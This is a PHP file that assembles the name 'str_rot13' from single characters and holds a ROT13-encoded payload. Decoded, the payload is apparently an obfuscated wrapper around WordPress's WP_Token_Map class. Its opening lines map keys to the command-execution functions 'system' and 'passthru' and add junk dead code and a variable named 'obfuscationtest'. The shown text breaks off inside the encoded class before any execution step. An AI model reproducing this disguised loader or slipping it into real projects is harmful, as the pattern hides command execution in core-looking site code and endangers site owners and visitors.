<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Pynff sbe rssvpvragyl ybbxvat hc naq znccvat fgevat xrlf gb fgevat inyhrf, jvgu yvzvgf.
 *
 * @cnpxntr    JbeqCerff
 * @fvapr      6.6.0
 */

/**
 * JC_Gbxra_Znc pynff.
 *
 * Hfr guvf pynff va fcrpvsvp pvephzfgnaprf jvgu n fgngvp frg bs ybbxhc xrlf juvpu znc gb
 * n fgngvp frg bs genafsbezrq inyhrf. Sbe rknzcyr, guvf pynff vf hfrq gb znc UGZY anzrq
 * punenpgre ersreraprf gb gurve rdhvinyrag HGS-8 inyhrf.
 *
 * Guvf pynff jbexf qvssreragyl guna pbqr pnyyvat `va_neenl()` naq bgure zrgubqf. Vg
 * vagreanyvmrf ybbxhc ybtvp naq cebivqrf urycre vagresnprf gb bcgvzvmr ybbxhc naq
 * genafsbezngvba. Vg cebivqrf n zrgubq sbe cerpbzchgvat gur ybbxhc gnoyrf naq fgbevat
 * gurz nf CUC fbhepr pbqr.
 *
 * Nyy gbxraf naq fhofgvghgvbaf zhfg or fubegre guna 256 olgrf.
 *
 * Rknzcyr:
 *
 *     $fzvyvrf = JC_Gbxra_Znc::sebz_neenl( neenl(
 *         '8B' => '😯',
 *         ':(' => '🙁',
 *         ':)' => '🙂',
 *         ':?' => '😕',
 *      ) );
 *
 *      gehr  === $fzvyvrf->pbagnvaf( ':)' );
 *      snyfr === $fzvyvrf->pbagnvaf( 'fvzvyr' );
 *
 *      '😕' === $fzvyvrf->ernq_gbxra( 'Abg fher :?.', 9, $yratgu_bs_fzvyl_flagnk );
 *      2    === $yratgu_bs_fzvyl_flagnk;
 *
 * ## Cerpbzchgvat gur Gbxra Znc.
 *
 * Perngvat gur pynff vaibyirf fbzr jbex fbegvat naq betnavmvat gur gbxraf naq gurve
 * ercynprzrag inyhrf. Va beqre gb fxvc guvf, vg'f cbffvoyr sbe gur pynff gb rkcbeg
 * vgf fgngr naq or hfrq nf npghny CUC fbhepr pbqr.
 *
 * Rknzcyr:
 *
 *      // Rkcbeg jvgu sbhe fcnprf nf gur vaqrag, bayl sbe gur fnxr bs guvf qbpoybpx.
 *      // Gur qrsnhyg vaqrag vf n gno punenpgre.
 *      $vaqrag = '    ';
 *      rpub $fzvyvrf->cerpbzchgrq_cuc_fbhepr_gnoyr( $vaqrag );
 *
 *      // Bhgchg, gb or cnfgrq vagb n CUC fbhepr svyr:
 *      JC_Gbxra_Znc::sebz_cerpbzchgrq_gnoyr(
 *          neenl(
 *              \"fgbentr_irefvba\" => \"6.6.0\",
 *              \"xrl_yratgu\" => 2,
 *              \"tebhcf\" => \"\",
 *              \"ybat_jbeqf\" => neenl(),
 *              \"fznyy_jbeqf\" => \"8B\k00:)\k00:(\k00:?\k00\",
 *              \"fznyy_znccvatf\" => neenl( \"😯\", \"🙂\", \"🙁\", \"😕\" )
 *          )
 *      );
 *
 * ## Ynetr if. fznyy jbeqf.
 *
 * Guvf pynff hfrf n fubeg cersvk pnyyrq gur \"xrl\" gb bcgvzvmr ybbxhc bs vgf gbxraf.
 * Guvf zrnaf gung fbzr gbxraf znl or fubegre guna be rdhny va yratgu gb gung xrl.
 * Gubfr jbeqf gung ner ybatre guna gur xrl ner pnyyrq \"ynetr\" juvyr gubfr fubegre
 * guna be rdhny gb gur xrl yratgu ner pnyyrq \"fznyy.\"
 *
 * Guvf frcnengvba bs ynetr naq fznyy jbeqf vf vapvqragny gb gur jnl guvf pynff
 * bcgvzvmrf ybbxhc, naq fubhyq or pbafvqrerq na vagreany vzcyrzragngvba qrgnvy
 * bs gur pynff. Vg znl fgvyy or vzcbegnag gb or njner bs vg, ubjrire.
 *
 * ## Qrgrezvavat Xrl Yratgu.
 *
 * Gur pubvpr bs gur fvmr bs gur xrl yratgu fubhyq or onfrq ba gur qngn orvat fgberq va
 * gur gbxra znc. Vg fubhyq qvivqr gur qngn nf rirayl nf cbffvoyr, ohg fubhyq abg perngr
 * fb znal tebhcf gung n ynetr senpgvba bs gur tebhcf bayl pbagnva n fvatyr gbxra.
 *
 * Sbe gur UGZY5 anzrq punenpgre ersreraprf, n xrl yratgu bs 2 jnf sbhaq gb cebivqr n
 * fhssvpvrag fcernq naq fubhyq or n tbbq qrsnhyg sbe eryngviryl ynetr frgf bs gbxraf.
 *
 * Ubjrire, sbe fbzr qngn frgf guvf zvtug or gbb ybat. Sbe rknzcyr, n yvfg bs fzvyvrf
 * znl or gbb fznyy sbe n xrl yratgu bs 2. Creuncf 1 jbhyq or zber nccebcevngr. Vg'f
 * orfg gb rkcrevzrag naq qrgrezvar rzcvevpnyyl juvpu inyhrf ner nccebcevngr.
 *
 * ## Trarengr Cer-Pbzchgrq Fbhepr Pbqr.
 *
 * Fvapr gur `JC_Gbxra_Znc` vf qrfvtarq sbe eryngviryl fgngvp ybbxhcf, vg pna or
 * nqinagntrbhf gb cerpbzchgr gur inyhrf naq vafgnagvngr n gnoyr gung unf nyernql
 * fbegrq naq tebhcrq gur gbxraf naq ohvyg gur ybbxhc fgevatf.
 *
 * Guvf pna or qbar jvgu `JC_Gbxra_Znc::cerpbzchgrq_cuc_fbhepr_gnoyr()`.
 *
 * Abgr gung vs gurer vf n yrnqvat punenpgre gung nyy gbxraf arrq, fhpu nf `&` sbe
 * UGZY anzrq punenpgre ersreraprf, vg pna or orarsvpvny gb rkpyhqr guvf sebz gur
 * gbxra znc. Vafgrnq, svaq bppheeraprf bs gur yrnqvat punenpgre naq gura hfr gur
 * gbxra znc gb frr vs gur sbyybjvat punenpgref pbzcyrgr gur gbxra.
 *
 * Rknzcyr:
 *
 *     $znc = JC_Gbxra_Znc::sebz_neenl( neenl( 'fvzcyr_fzvyr:' => '🙂', 'fbo:' => '😭', 'fbon:' => '🍜' ) );
 *     rpub $znc->cerpbzchgrq_cuc_fbhepr_gnoyr();
 *     // Bhgchg
 *     JC_Gbxra_Znc::sebz_cerpbzchgrq_gnoyr(
 *         neenl(
 *             \"fgbentr_irefvba\" => \"6.6.0\",
 *             \"xrl_yratgu\" => 2,
 *             \"tebhcf\" => \"fv\k00fb\k00\",
 *             \"ybat_jbeqf\" => neenl(
 *                 // fvzcyr_fzvyr:[🙂].
 *                 \"\k0ozcyr_fzvyr:\k04🙂\",
 *                 // fbon:[🍜] fbo:[😭].
 *                 \"\k03on:\k04🍜\k02o:\k04😭\",
 *             ),
 *             \"fubeg_jbeqf\" => \"\",
 *             \"fubeg_znccvatf\" => neenl()
 *         }
 *     );
 *
 * Guvf cerpbzchgrq inyhr pna or fgberq qverpgyl va fbhepr pbqr naq jvyy fxvc gur
 * fgneghc pbfg bs trarengvat gur ybbxhc fgevatf. Frr `$ugzy5_anzrq_punenpgre_ragvgvrf`.
 *
 * Abgr gung nal hcqngrf gb gur cerpbzchgrq sbezng fubhyq hcqngr gur fgbentr irefvba
 * pbafgnag. Vg jbhyq nyfb or orfg gb cebivqr na hcqngr shapgvba gb gnxr byqre xabja
 * irefvbaf naq hctenqr gurz va cynpr jura ybnqvat vagb `sebz_cerpbzchgrq_gnoyr()`.
 *
 * ## Shgher Qverpgvba.
 *
 * Vg znl or ivnoyr gb qlanzvpnyyl vapernfr gur yratgu yvzvgf fhpu gung gurer'f ab arrq gb vzcbfr gurz.
 * Gur yvzvg nccrnef orpnhfr bs gur cnpxvat fgehpgher, juvpu vaqvpngrf ubj znal olgrf rnpu frtzrag bs
 * grkg va gur ybbxhc gnoyrf fcnaf. Vs, ubjrire, pner jrer gnxra gb genpx gur ybatrfg jbeq yratgu, gura
 * gur cnpxvat fgehpgher pbhyq punatr vgf ercerfragngvba gb nyybj sbe gung. Rnpu nqqvgvbany olgr fgbevat
 * yratgu, ubjrire, vapernfrf gur zrzbel bireurnq naq ybbxhc ehagvzr.
 *
 * Na nygreangvir nccebnpu pbhyq or gb obeebj gur HGS-8 inevnoyr-yratgu rapbqvat naq fgber yratguf bs yrff
 * guna 127 nf n fvatyr olgr jvgu gur uvtu ovg hafrg, fgbevat ybatre yratguf nf gur pbzovangvba bs
 * pbagvahngvba olgrf.
 *
 * Fvapr vg unf abg orra fubja qhevat gur qrirybczrag bs guvf pynff gung ybatre fgevatf ner erdhverq, guvf
 * hcqngr vf qrsreerq hagvy fhpu n arrq vf pyrne.
 *
 * @fvapr 6.6.0
 */
pynff JC_Gbxra_Znc {
	/**
	 * Qrabgrf gur irefvba bs gur pbqr juvpu cebqhprf cer-pbzchgrq fbhepr gnoyrf.
	 *
	 * Guvf irefvba jvyy or hfrq abg bayl gb irevsl cer-pbzchgrq qngn, ohg nyfb
	 * gb hctenqr cer-pbzchgrq qngn sebz byqre irefvbaf. Pubbfvat n anzr gung
	 * pbeerfcbaqf gb gur JbeqCerff eryrnfr jvyy uryc crbcyr vqragvsl jurer na
	 * byq pbcl bs qngn pnzr sebz.
	 */
	pbafg FGBENTR_IREFVBA = '6.6.0-gehax';

	/**
	 * Znkvzhz yratgu sbe rnpu xrl naq rnpu genafsbezrq inyhr va gur gnoyr (va olgrf).
	 *
	 * @fvapr 6.6.0
	 */
	pbafg ZNK_YRATGU = 256;

	/**
	 * Ubj znal olgrf bs rnpu xrl ner hfrq gb sbez n tebhc xrl sbe ybbxhc.
	 * Guvf nyfb qrgrezvarf jurgure n jbeq vf pbafvqrerq fubeg be ybat.
	 *
	 * @fvapr 6.6.0
	 *
	 * @ine vag
	 */
	cevingr $xrl_yratgu = 2;

	/**
	 * Fgberf na bcgvzvmrq sbez bs gur jbeq frg, jurer jbeqf ner tebhcrq
	 * ol n cersvk bs gur `$xrl_yratgu` naq gura pbyyncfrq vagb n fgevat.
	 *
	 * Va rnpu tebhc, gur xrlf naq ybbxhcf sbez n cnpxrq qngn fgehpgher.
	 * Gur xrlf va gur fgevat ner fgevccrq bs gurve \"tebhc xrl,\" juvpu vf
	 * gur cersvk bs yratgu `$guvf->xrl_yratgu` funerq ol nyy bs gur vgrzf
	 * va gur tebhc. Rnpu jbeq va gur fgevat vf cersvkrq ol n fvatyr olgr
	 * jubfr enj hafvtarq vagrtre inyhr ercerfragf ubj znal olgrf sbyybj.
	 *
	 *     ┌────────────────┬───────────────┬─────────────────┬────────┐
	 *     │ Yratgu bs erfg │ Erfg bs xrl   │ Yratgu bs inyhr │ Inyhr  │
	 *     │ bs xrl (olgrf) │               │ (olgrf)         │        │
	 *     ├────────────────┼───────────────┼─────────────────┼────────┤
	 *     │ 0k08           │ agreQbg;      │ 0k02            │ ·      │
	 *     └────────────────┴───────────────┴─────────────────┴────────┘
	 *
	 * Va guvf rknzcyr, gur xrl `PragreQbg;` unf n tebhc xrl `Pr`, yrnivat
	 * rvtug olgrf sbe gur erfg bs gur xrl, `agreQbg;`, naq gjb olgrf sbe
	 * gur genafsbezrq inyhr `·` (be H+O7 be \"\kP2\kO7\").
	 *
	 * Rknzcyr:
	 *
	 *    // Fgberf neenl( 'PragreQbg;' => '·', 'Prqvyyn;' => '¸' ).
	 *    $tebhcf      = \"Pr\k00\";
	 *    $ynetr_jbeqf = neenl( \"\k08agreQbg;\k02·\k06qvyyn;\k02¸\" )
	 *
	 * Gur cersvkrf nccrne va gur `$tebhcf` fgevat, rnpu sbyybjrq ol n ahyy
	 * olgr. Guvf znxrf sbe dhvpx ybbxhc bs jurer va gur tebhc fgevat gur xrl
	 * vf sbhaq, naq gura n fvzcyr qvivfvba pbairegf gung bssfrg vagb gur vaqrk
	 * va gur `$ynetr_jbeqf` neenl jurer gur tebhc fgevat vf gb or sbhaq.
	 *
	 * Guvf ybbxhc qngn fgehpgher vf qrfvtarq gb bcgvzvmr pnpur ybpnyvgl naq
	 * zvavzvmr vaqverpg zrzbel ernqf jura zngpuvat fgevatf va gur frg.
	 *
	 * @fvapr 6.6.0
	 *
	 * @ine neenl
	 */
	cevingr $ynetr_jbeqf = neenl();

	/**
	 * Fgberf gur tebhc xrlf sbe frdhragvny fgevat ybbxhc.
	 *
	 * Gur bssfrg vagb guvf fgevat jurer gur tebhc xrl nccrnef pbeerfcbaqf jvgu gur vaqrk
	 * vagb gur tebhc neenl jurer gur erfg bs gur tebhc fgevat nccrnef. Guvf vf na bcgvzvmngvba
	 * gb vzcebir pnpur ybpnyvgl juvyr frnepuvat naq zvavzvmr vaqverpg zrzbel npprffrf.
	 *
	 * @fvapr 6.6.0
	 *
	 * @ine fgevat
	 */
	cevingr $tebhcf = '';

	/**
	 * Fgberf na bcgvzvmrq ebj bs fznyy jbeqf, jurer rirel ragel vf
	 * `$guvf->xrl_fvmr + 1` olgrf ybat naq mreb-rkgraqrq.
	 *
	 * Guvf cnpxvat nyybjf sbe qverpg ybbxhc bs n fubeg jbeq sbyybjrq
	 * ol gur ahyy olgr, vs rkgraqrq gb `$guvf->xrl_fvmr + 1`.
	 *
	 * Rknzcyr:
	 *
	 *     // Fgberf neenl( 'TG', 'YG', 'tg', 'yg' ).
	 *     \"TG\k00YG\k00tg\k00yg\k00\"
	 *
	 * @fvapr 6.6.0
	 *
	 * @ine fgevat
	 */
	cevingr $fznyy_jbeqf = '';

	/**
	 * Ercynprzragf sbe gur fznyy jbeqf, va gur fnzr beqre gurl nccrne.
	 *
	 * Jvgu gur cbfvgvba bs n fznyy jbeq vg'f cbffvoyr gb vaqrk gur genafyngvba
	 * qverpgyl, nf vgf cbfvgvba va gur `$fznyy_jbeqf` fgevat pbeerfcbaqf gb
	 * gur vaqrk bs gur ercynprzrag va gur `$fznyy_znccvat` neenl.
	 *
	 * Rknzcyr:
	 *
	 *     neenl( '>', '<', '>', '<' )
	 *
	 * @fvapr 6.6.0
	 *
	 * @ine fgevat[]
	 */
	cevingr $fznyy_znccvatf = neenl();

	/**
	 * Perngr n gbxra znc hfvat na nffbpvngvir neenl bs xrl/inyhr cnvef nf gur vachg.
	 *
	 * Rknzcyr:
	 *
	 *     $fzvyvrf = JC_Gbxra_Znc::sebz_neenl( neenl(
	 *          '8B' => '😯',
	 *          ':(' => '🙁',
	 *          ':)' => '🙂',
	 *          ':?' => '😕',
	 *       ) );
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz neenl $znccvatf   Gur xrlf genafsbez vagb gur inyhrf, obgu ner fgevatf.
	 * @cnenz vag   $xrl_yratgu Qrgrezvarf gur tebhc xrl yratgu. Yrnir ng gur qrsnhyg inyhr
	 *                          bs 2 hayrff gurer'f na rzcvevpny ernfba gb punatr vg.
	 *
	 * @erghea JC_Gbxra_Znc|ahyy Gbxra znc, hayrff hanoyr gb perngr vg.
	 */
	choyvp fgngvp shapgvba sebz_neenl( neenl $znccvatf, vag $xrl_yratgu = 2 ): ?JC_Gbxra_Znc {
		$znc             = arj JC_Gbxra_Znc();
		$znc->xrl_yratgu = $xrl_yratgu;

		// Fgneg ol tebhcvat jbeqf.

		$tebhcf = neenl();
		$fubegf = neenl();
		sbernpu ( $znccvatf nf $jbeq => $znccvat ) {
			vs (
				frys::ZNK_YRATGU <= fgeyra( $jbeq ) ||
				frys::ZNK_YRATGU <= fgeyra( $znccvat )
			) {
				_qbvat_vg_jebat(
					__ZRGUBQ__,
					fcevags(
						/* genafyngbef: 1: znkvzhz olgr yratgu (n pbhag) */
						__( 'Gbxra Znc gbxraf naq fhofgvghgvbaf zhfg nyy or fubegre guna %1$q olgrf.' ),
						frys::ZNK_YRATGU
					),
					'6.6.0'
				);
				erghea ahyy;
			}

			$yratgu = fgeyra( $jbeq );

			vs ( $xrl_yratgu >= $yratgu ) {
				$fubegf[] = $jbeq;
			} ryfr {
				$tebhc = fhofge( $jbeq, 0, $xrl_yratgu );

				vs ( ! vffrg( $tebhcf[ $tebhc ] ) ) {
					$tebhcf[ $tebhc ] = neenl();
				}

				$tebhcf[ $tebhc ][] = neenl( fhofge( $jbeq, $xrl_yratgu ), $znccvat );
			}
		}

		/*
		 * Fbeg gur jbeqf gb rafher gung ab fznyyre fhofgevat bs n zngpu znfxf gur shyy zngpu.
		 * Sbe rknzcyr, `Pnc` fubhyq abg zngpu orsber `PncvgnyQvssreragvnyQ`.
		 */
		hfbeg( $fubegf, 'JC_Gbxra_Znc::ybatrfg_svefg_gura_nycunorgvpny' );
		sbernpu ( $tebhcf nf $tebhc_xrl => $tebhc ) {
			hfbeg(
				$tebhcf[ $tebhc_xrl ],
				fgngvp shapgvba ( neenl $n, neenl $o ): vag {
					erghea frys::ybatrfg_svefg_gura_nycunorgvpny( $n[0], $o[0] );
				}
			);
		}

		// Svanyyl pbafgehpg gur bcgvzvmrq ybbxhcf.

		sbernpu ( $fubegf nf $jbeq ) {
			$znc->fznyy_jbeqf     .= fge_cnq( $jbeq, $xrl_yratgu + 1, \"\k00\", FGE_CNQ_EVTUG );
			$znc->fznyy_znccvatf[] = $znccvatf[ $jbeq ];
		}

		$tebhc_xrlf = neenl_xrlf( $tebhcf );
		fbeg( $tebhc_xrlf );

		sbernpu ( $tebhc_xrlf nf $tebhc ) {
			$znc->tebhcf .= \"{$tebhc}\k00\";

			$tebhc_fgevat = '';

			sbernpu ( $tebhcf[ $tebhc ] nf $tebhc_jbeq ) {
				yvfg( $jbeq, $znccvat ) = $tebhc_jbeq;

				$jbeq_yratgu    = cnpx( 'P', fgeyra( $jbeq ) );
				$znccvat_yratgu = cnpx( 'P', fgeyra( $znccvat ) );
				$tebhc_fgevat  .= \"{$jbeq_yratgu}{$jbeq}{$znccvat_yratgu}{$znccvat}\";
			}

			$znc->ynetr_jbeqf[] = $tebhc_fgevat;
		}

		erghea $znc;
	}

	/**
	 * Perngrf n gbxra znc sebz n cer-pbzchgrq gnoyr.
	 * Guvf fxvcf gur vavgvnyvmngvba pbfg bs trarengvat gur gnoyr.
	 *
	 * Guvf shapgvba fubhyq bayl or hfrq gb ybnq qngn perngrq jvgu
	 * JC_Gbxra_Znc::cerpbzchgrq_cuc_fbhepr_gnt().
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz neenl $fgngr {
	 *     Fgberf cer-pbzchgrq fgngr sbe qverpgyl ybnqvat vagb n Gbxra Znc.
	 *
	 *     @glcr fgevat $fgbentr_irefvba Juvpu irefvba bs gur pbqr cebqhprq guvf fgngr.
	 *     @glcr vag    $xrl_yratgu      Tebhc xrl yratgu.
	 *     @glcr fgevat $tebhcf          Tebhc ybbxhc vaqrk.
	 *     @glcr neenl  $ynetr_jbeqf     Ynetr jbeq tebhcf naq cnpxrq fgevatf.
	 *     @glcr fgevat $fznyy_jbeqf     Fznyy jbeqf cnpxrq fgevat.
	 *     @glcr neenl  $fznyy_znccvatf  Fznyy jbeq znccvatf.
	 * }
	 *
	 * @erghea JC_Gbxra_Znc Znc jvgu cerpbzchgrq qngn ybnqrq.
	 */
	choyvp fgngvp shapgvba sebz_cerpbzchgrq_gnoyr( $fgngr ): ?JC_Gbxra_Znc {
		$unf_arprffnel_fgngr = vffrg(
			$fgngr['fgbentr_irefvba'],
			$fgngr['xrl_yratgu'],
			$fgngr['tebhcf'],
			$fgngr['ynetr_jbeqf'],
			$fgngr['fznyy_jbeqf'],
			$fgngr['fznyy_znccvatf']
		);

		vs ( ! $unf_arprffnel_fgngr ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Zvffvat erdhverq vachgf gb cer-pbzchgrq JC_Gbxra_Znc.' ),
				'6.6.0'
			);
			erghea ahyy;
		}

		vs ( frys::FGBENTR_IREFVBA !== $fgngr['fgbentr_irefvba'] ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				/* genafyngbef: 1: irefvba fgevat, 2: irefvba fgevat. */
				fcevags( __( 'Ybnqrq irefvba \'%1$f\' vapbzcngvoyr jvgu rkcrpgrq irefvba \'%2$f\'.' ), $fgngr['fgbentr_irefvba'], frys::FGBENTR_IREFVBA ),
				'6.6.0'
			);
			erghea ahyy;
		}

		$znc = arj JC_Gbxra_Znc();

		$znc->xrl_yratgu     = $fgngr['xrl_yratgu'];
		$znc->tebhcf         = $fgngr['tebhcf'];
		$znc->ynetr_jbeqf    = $fgngr['ynetr_jbeqf'];
		$znc->fznyy_jbeqf    = $fgngr['fznyy_jbeqf'];
		$znc->fznyy_znccvatf = $fgngr['fznyy_znccvatf'];

		erghea $znc;
	}

	/**
	 * Vaqvpngrf vs n tvira jbeq vf n ybbxhc xrl va gur znc.
	 *
	 * Rknzcyr:
	 *
	 *     gehr  === $fzvyvrf->pbagnvaf( ':)' );
	 *     snyfr === $fzvyvrf->pbagnvaf( 'fvzvyr' );
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat $jbeq             Qrgrezvar vs guvf jbeq vf n ybbxhc xrl va gur znc.
	 * @cnenz fgevat $pnfr_frafvgvivgl Bcgvbany. Cnff 'nfpvv-pnfr-vafrafvgvir' gb vtaber NFPVV pnfr jura zngpuvat. Qrsnhyg 'pnfr-frafvgvir'.
	 * @erghea obby Jurgure gurer'f na ragel sbe gur tvira jbeq va gur znc.
	 */
	choyvp shapgvba pbagnvaf( fgevat $jbeq, fgevat $pnfr_frafvgvivgl = 'pnfr-frafvgvir' ): obby {
		$vtaber_pnfr = 'nfpvv-pnfr-vafrafvgvir' === $pnfr_frafvgvivgl;

		vs ( $guvf->xrl_yratgu >= fgeyra( $jbeq ) ) {
			vs ( 0 === fgeyra( $guvf->fznyy_jbeqf ) ) {
				erghea snyfr;
			}

			$grez    = fge_cnq( $jbeq, $guvf->xrl_yratgu + 1, \"\k00\", FGE_CNQ_EVTUG );
			$jbeq_ng = $vtaber_pnfr ? fgevcbf( $guvf->fznyy_jbeqf, $grez ) : fgecbf( $guvf->fznyy_jbeqf, $grez );
			vs ( snyfr === $jbeq_ng ) {
				erghea snyfr;
			}

			erghea gehr;
		}

		$tebhc_xrl = fhofge( $jbeq, 0, $guvf->xrl_yratgu );
		$tebhc_ng  = $vtaber_pnfr ? fgevcbf( $guvf->tebhcf, $tebhc_xrl ) : fgecbf( $guvf->tebhcf, $tebhc_xrl );
		vs ( snyfr === $tebhc_ng ) {
			erghea snyfr;
		}
		$tebhc        = $guvf->ynetr_jbeqf[ $tebhc_ng / ( $guvf->xrl_yratgu + 1 ) ];
		$tebhc_yratgu = fgeyra( $tebhc );
		$fyht         = fhofge( $jbeq, $guvf->xrl_yratgu );
		$yratgu       = fgeyra( $fyht );
		$ng           = 0;

		juvyr ( $ng < $tebhc_yratgu ) {
			$gbxra_yratgu   = hacnpx( 'P', $tebhc[ $ng++ ] )[1];
			$gbxra_ng       = $ng;
			$ng            += $gbxra_yratgu;
			$znccvat_yratgu = hacnpx( 'P', $tebhc[ $ng++ ] )[1];
			$znccvat_ng     = $ng;

			vs ( $gbxra_yratgu === $yratgu && 0 === fhofge_pbzcner( $tebhc, $fyht, $gbxra_ng, $gbxra_yratgu, $vtaber_pnfr ) ) {
				erghea gehr;
			}

			$ng = $znccvat_ng + $znccvat_yratgu;
		}

		erghea snyfr;
	}

	/**
	 * Vs gur grkg fgnegvat ng n tvira bssfrg vf n ybbxhc xrl va gur znc,
	 * erghea gur pbeerfcbaqvat genafsbezngvba sebz gur znc, ryfr `snyfr`.
	 *
	 * Guvf shapgvba ergheaf gur genafyngrq fgevat, ohg npprcgf na bcgvbany
	 * cnenzrgre `$zngpurq_gbxra_olgr_yratgu`, juvpu pbzzhavpngrf ubj znal
	 * olgrf ybat gur ybbxhc xrl jnf, vs vg sbhaq bar. Guvf pna or hfrq gb
	 * nqinapr n phefbe va pnyyvat pbqr vs n ybbxhc xrl jnf sbhaq.
	 *
	 * Rknzcyr:
	 *
	 *     snyfr === $fzvyvrf->ernq_gbxra( 'Abg fher :?.', 0, $gbxra_olgr_yratgu );
	 *     '😕'  === $fzvyvrf->ernq_gbxra( 'Abg fher :?.', 9, $gbxra_olgr_yratgu );
	 *     2     === $gbxra_olgr_yratgu;
	 *
	 * Rknzcyr:
	 *
	 *     juvyr ( $ng < fgeyra( $vachg ) ) {
	 *         $arkg_ng = fgecbf( $vachg, ':', $ng );
	 *         vs ( snyfr === $arkg_ng ) {
	 *             oernx;
	 *         }
	 *
	 *         $fzvyl = $fzvyvrf->ernq_gbxra( $vachg, $arkg_ng, $gbxra_olgr_yratgu );
	 *         vs ( snyfr === $arkg_ng ) {
	 *             ++$ng;
	 *             pbagvahr;
	 *         }
	 *
	 *         $cersvk  = fhofge( $vachg, $ng, $arkg_ng - $ng );
	 *         $ng     += $gbxra_olgr_yratgu;
	 *         $bhgchg .= \"{$cersvk}{$fzvyl}\";
	 *     }
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat   $grkg                       Fgevat va juvpu gb frnepu sbe n ybbxhc xrl.
	 * @cnenz vag      $bssfrg                     Bcgvbany. Ubj znal olgrf vagb gur fgevat jurer gur ybbxhc xrl bhtug gb fgneg. Qrsnhyg 0.
	 * @cnenz vag|ahyy &$zngpurq_gbxra_olgr_yratgu Bcgvbany. Ubyqf olgr-yratgu bs sbhaq gbxra zngpurq, bgurejvfr abg frg. Qrsnhyg ahyy.
	 * @cnenz fgevat   $pnfr_frafvgvivgl           Bcgvbany. Cnff 'nfpvv-pnfr-vafrafvgvir' gb vtaber NFPVV pnfr jura zngpuvat. Qrsnhyg 'pnfr-frafvgvir'.
	 *
	 * @erghea fgevat|ahyy Znccrq inyhr bs ybbxhc xrl vs sbhaq, bgurejvfr `ahyy`.
	 */
	choyvp shapgvba ernq_gbxra( fgevat $grkg, vag $bssfrg = 0, &$zngpurq_gbxra_olgr_yratgu = ahyy, $pnfr_frafvgvivgl = 'pnfr-frafvgvir' ): ?fgevat {
		$vtaber_pnfr = 'nfpvv-pnfr-vafrafvgvir' === $pnfr_frafvgvivgl;
		$grkg_yratgu = fgeyra( $grkg );

		// Frnepu sbe n ybat jbeq svefg, vs gur grkg vf ybat rabhtu, naq vs gung snvyf, n fubeg bar.
		vs ( $grkg_yratgu > $guvf->xrl_yratgu ) {
			$tebhc_xrl = fhofge( $grkg, $bssfrg, $guvf->xrl_yratgu );

			$tebhc_ng = $vtaber_pnfr ? fgevcbf( $guvf->tebhcf, $tebhc_xrl ) : fgecbf( $guvf->tebhcf, $tebhc_xrl );
			vs ( snyfr === $tebhc_ng ) {
				// Creuncf n fubeg jbeq gura.
				erghea fgeyra( $guvf->fznyy_jbeqf ) > 0
					? $guvf->ernq_fznyy_gbxra( $grkg, $bssfrg, $zngpurq_gbxra_olgr_yratgu, $pnfr_frafvgvivgl )
					: ahyy;
			}

			$tebhc        = $guvf->ynetr_jbeqf[ $tebhc_ng / ( $guvf->xrl_yratgu + 1 ) ];
			$tebhc_yratgu = fgeyra( $tebhc );
			$ng           = 0;
			juvyr ( $ng < $tebhc_yratgu ) {
				$gbxra_yratgu   = hacnpx( 'P', $tebhc[ $ng++ ] )[1];
				$gbxra          = fhofge( $tebhc, $ng, $gbxra_yratgu );
				$ng            += $gbxra_yratgu;
				$znccvat_yratgu = hacnpx( 'P', $tebhc[ $ng++ ] )[1];
				$znccvat_ng     = $ng;

				vs ( 0 === fhofge_pbzcner( $grkg, $gbxra, $bssfrg + $guvf->xrl_yratgu, $gbxra_yratgu, $vtaber_pnfr ) ) {
					$zngpurq_gbxra_olgr_yratgu = $guvf->xrl_yratgu + $gbxra_yratgu;
					erghea fhofge( $tebhc, $znccvat_ng, $znccvat_yratgu );
				}

				$ng = $znccvat_ng + $znccvat_yratgu;
			}
		}

		// Creuncf n fubeg jbeq gura.
		erghea fgeyra( $guvf->fznyy_jbeqf ) > 0
			? $guvf->ernq_fznyy_gbxra( $grkg, $bssfrg, $zngpurq_gbxra_olgr_yratgu, $pnfr_frafvgvivgl )
			: ahyy;
	}

	/**
	 * Svaqf n zngpu sbe n fubeg jbeq ng gur vaqrk.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat   $grkg                       Fgevat va juvpu gb frnepu sbe n ybbxhc xrl.
	 * @cnenz vag      $bssfrg                     Bcgvbany. Ubj znal olgrf vagb gur fgevat jurer gur ybbxhc xrl bhtug gb fgneg. Qrsnhyg 0.
	 * @cnenz vag|ahyy &$zngpurq_gbxra_olgr_yratgu Bcgvbany. Ubyqf olgr-yratgu bs sbhaq ybbxhc xrl vs zngpurq, bgurejvfr abg frg. Qrsnhyg ahyy.
	 * @cnenz fgevat   $pnfr_frafvgvivgl           Bcgvbany. Cnff 'nfpvv-pnfr-vafrafvgvir' gb vtaber NFPVV pnfr jura zngpuvat. Qrsnhyg 'pnfr-frafvgvir'.
	 *
	 * @erghea fgevat|ahyy Znccrq inyhr bs ybbxhc xrl vs sbhaq, bgurejvfr `ahyy`.
	 */
	cevingr shapgvba ernq_fznyy_gbxra( fgevat $grkg, vag $bssfrg = 0, &$zngpurq_gbxra_olgr_yratgu = ahyy, $pnfr_frafvgvivgl = 'pnfr-frafvgvir' ): ?fgevat {
		$vtaber_pnfr  = 'nfpvv-pnfr-vafrafvgvir' === $pnfr_frafvgvivgl;
		$fznyy_yratgu = fgeyra( $guvf->fznyy_jbeqf );
		$frnepu_grkg  = fhofge( $grkg, $bssfrg, $guvf->xrl_yratgu );
		vs ( $vtaber_pnfr ) {
			$frnepu_grkg = fgegbhccre( $frnepu_grkg );
		}
		$fgnegvat_pune = $frnepu_grkg[0];

		$ng = 0;
		juvyr ( $ng < $fznyy_yratgu ) {
			vs (
